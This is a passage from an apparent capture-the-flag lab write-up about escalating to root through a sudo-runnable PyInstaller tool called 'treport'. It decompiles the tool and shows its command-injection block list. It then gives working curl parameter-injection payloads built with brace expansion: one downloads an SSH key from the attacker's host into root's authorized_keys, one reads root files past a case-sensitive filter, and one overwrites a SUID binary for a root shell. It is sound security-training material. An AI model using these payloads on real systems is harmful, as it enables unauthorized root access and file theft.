[1588] Failed to execute script 'treport' due to unhandled exception!

```

There’s a couple interesting things here. For one, it’s trying to read `/root/reports/`. The exception shows it’s actually a Python application.

Running `file` shows it’s actually an ELF:

```

code@code:~$ file /usr/bin/treport 
/usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped

```

This must be bundled with an application like [Pyinstaller](https://dev.to/petercour/python-to-executable-35pj).

I’ll pull a copy of this binary back to my host.

### Reverse treport

#### Identify Framework

I’ll run `strings` on the binary to look for clues about what kind of packager was used to go from Python to an ELF. I’ll notice a lot of strings with `pyi`:

```

oxdf@hacky$ strings treport | grep -i pyi
Error copying %s
_pyi_main_co
_PYI_PROCNAME
PyImport_AddModule
PyImport_ExecCodeModule
PyImport_ImportModule
Cannot dlsym for PyImport_AddModule
Cannot dlsym for PyImport_ExecCodeModule
Cannot dlsym for PyImport_ImportModule
pyi-
pyi-runtime-tmpdir
pyi-bootloader-ignore-signals
LOADER: failed to allocate argv_pyi: %s
PyIb
mpyimod01_os_path
mpyimod02_archive
mpyimod03_importers
mpyimod04_ctypes
spyiboot01_bootstrap
spyi_rth_pkgutil
spyi_rth_multiprocessing
spyi_rth_inspect

```

These remind me of the binary from [funware at CactusCon 2022](/2022/02/07/funware-cactuscon-2022-ctf.html#3-malware-language). Googling for “\_pyi\_main\_co” returns a link to the [pyinstaller GitHub](https://github.com/pyinstaller/pyinstaller/blob/develop/bootloader/src/pyi_launch.c):

![image-20220505195521816](https://0xdfimages.gitlab.io/img/image-20220505195521816.png)

Seems like it could be [PyInstaller](https://pyinstaller.org/en/stable/).

#### Extract pyc Files

I’ll use a tool called [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor), or `pyinstxtractor.py` to pull out the various libraries and Python byte code files from the ELF:

```

oxdf@hacky$ python /opt/pyinstxtractor/pyinstxtractor.py treport 
[+] Processing treport
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6798297 bytes
[+] Found 46 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: treport.pyc
[+] Found 223 files in PYZ archive
[+] Successfully extracted pyinstaller archive: treport

You can now use a python decompiler on the pyc files within the extracted directory

```

If my Python version doesn’t match up with the one used to build the original, then it will warn me of that. I went through that in [funware](/2022/02/07/funware-cactuscon-2022-ctf.html#switch-python-version), but I don’t have to here.

There’s noq a folder of the various extracted files:

```

oxdf@hacky$ ls treport_extracted/
base_library.zip  libffi.so.7          libssl.so.1.1            pyimod02_archive.pyc         pyi_rth_pkgutil.pyc
libbz2.so.1.0     liblzma.so.5         libtinfo.so.6            pyimod03_importers.pyc       PYZ-00.pyz
libcrypto.so.1.1  libmpdec.so.2        libz.so.1                pyimod04_ctypes.pyc          PYZ-00.pyz_extracted
lib-dynload       libpython3.8.so.1.0  pyiboot01_bootstrap.pyc  pyi_rth_inspect.pyc          struct.pyc
libexpat.so.1     libreadline.so.8     pyimod01_os_path.pyc     pyi_rth_multiprocessing.pyc  treport.pyc

```

#### Recover .py Files

[uncompyle6](https://pypi.org/project/uncompyle6/) will recover the original Python files from a `.pyc` file. I’ll install it with `pipx install uncompyle6` (or `pip`, but `pipx` is a really nice way to install Python applications), and then point it at the main file:

```

oxdf@hacky$ uncompyle6 treport_extracted/treport.pyc > treport.py

```

### Python Analysis

The main part of the recovered Python is the menu:

```

if __name__ == '__main__':
    obj = threat_report()
    print('1.Create Threat Report.')
    print('2.Read Threat Report.')
    print('3.Download A Threat Report.')
    print('4.Quit.')
    check = True
    if check:
        choice = input('Enter your choice:')
        try:
            choice = int(choice)
        except:
            print('Wrong Input')
            sys.exit(0)
        else:
            if choice == 1:
                obj.create()
            elif choice == 2:
                obj.list_files()
                obj.read_file()
            elif choice == 3:
                obj.download()
            elif choice == 4:
                check = False
            else:
                print('Wrong input.')

```

It create a `treat_report` object, prints the menu, reads the input, and calls the associated function.

The `threat_report` class is defined above. Option 1 calls `create`, which prompts for a filename and content, and writes the content to the file name:

```

    def create(self):
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
        with open(file_path, 'w') as (fd):
            fd.write(content)

```

Because it looks for `../` in the file name, I don’t see a good way to get outside of the `reports` directory.

Option 2 calls `list_files()` and then `read_file()`:

```

    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join([str(elem) for elem in file_list])
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    def read_file(self):
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
        try:
            with open(file_name, 'r') as (fd):
                contents = fd.read()
        except:
            print('SOMETHING IS WRONG')
        else:
            print(contents)

```

It’s listing the files in `/root/reports`, and then prompting for a file to read. Again, it’s looking for `../` in the input file name, so I don’t see a good way to get around that.

Option 3 calls `download`:

```

    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = ['$', '`', ';', '&', '|', '||', '>', '<', '?', "'", '@', '#', '$', '%', '^', '(', ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
        if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
            print('INVALID URL')
            sys.exit(0)
        for vars in command_injection_list:
            if vars in ip:
                print('NOT ALLOWED')
                sys.exit(0)
            cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
            os.system(cmd)

```

This is particularly interesting because it ends with a `os.system` call. There’s three filters applied:
1. `bool(re.search('\\s', ip))` looks for any whitespace in the input, and fails if any is found.
2. It checks the input for “file”, “gopher” and “mysql” and fails if found.
3. It checks the input for a bunch of special characters, and fails if any are found.

### Parameter Injection

#### Background

The first challenge I’ll need to overcome is some way to break commands if I can’t use any whitespace. In the past I’ve used `${IFS}` to replace a space, but `$` is blocked.

Luckily, Bash also supports [Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html). I use this all the time with something like:

```

$ mv file{.sh,.bak}

```

This expands to:

```

$ mv file.sh file.bak

```

Because the command has my input surrounded by spaces, then if I pass in `{a,b,c,d}` that’s the same as `a b c d`.

While a good number of the special characters are blocked, including the ones I’d need to do command injection, it doesn’t block `-`, which means I should look at parameter injection.

The command I’m looking to inject into is:

```

curl [my input] -o /root/reports/threat_report_[current_time]

```

I can’t break from the `curl` and run some other command, but I can impact the arguments passed to `curl`.

#### Arbitrary File Write

To abuse this to write files, I’ll have `curl` fetch a file from my server, and I’ll inject an additional `-o` parameter. Because mine will come first, that’s the one `curl` will use. For example, if I input `{http://10.10.14.6/pub,-o,/root/.ssh/authorized_keys}`, then the command becomes:

```

curl http://10.10.14.6/pub -o /root/.ssh/authorized_keys -o /root/reports/threat_report_[current_time]

```

That will write the `pub` file to the root `authorized_keys` file.

I’ll try it. I’ll put my public key in my web root in a file named `pub`. Now I’ll run `treport`:

```

code@code:~$ sudo treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{http://10.10.14.6/pub,-o,/root/.ssh/authorized_keys}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    96  100    96    0     0    524      0 --:--:-- --:--:-- --:--:--   524
Enter your choice:

```

There’s a hit on my webserver:

```
10.10.11.126 - - [06/May/2022 00:57:27] "GET /pub HTTP/1.1" 200 -

```

And I can SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.126
...[snip]...
root@code:~# 

```

There are other files I could overwrite. `/etc/passwd`, `/etc/sudoers`, `/etc/shadow` all give a way to escalate. Or any SUID binary owned by root (I’ll show this after Arbitrary File Read).

#### Arbitrary File Read

The code prevents me from using the string `file`, presumably because `curl` will take a URL that starts with `file://` and read a file from the local filesystem.

But the Python check is case sensitive, and `curl` doesn’t care. I can combine that with the parameter injection to read files with a payload like:

```

{fiLe:///root/root.txt,-o-}

```

This will expand to:

```

curl fiLe:///root/root.txt -o- -o /root/reports/threat_report_[current_time]

```

`-o-` will write to stdout, so I’ll get the results right in this terminal:

```

Enter your choice:3
Enter the IP/file_name:{fiLe:///root/root.txt,-o-}
dbb21bbb************************

```

#### Read + Write Shell

I can combined these two for another way to get a root shell. I’ll pick a SUID root file like `/usr/bin/chsh` (can find them with `find / -perm -4000 -user root 2>/dev/null`).

I’ll overwrite that with `sh`:

```

Enter your choice:3
Enter the IP/file_name:{File:///bin/sh,-o,/usr/bin/chsh}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  126k  100  126k    0     0   123M      0 --:--:-- --:--:-- --:--:--  123M
Enter your choice:

```

Now I just run `chsh -p` (`-p` to keep privs from being dropped):

```

code@code:~$ chsh -p
# id
uid=1000(code) gid=1000(code) euid=0(root) groups=1000(code)

```

The `euid` allows me into `/root`.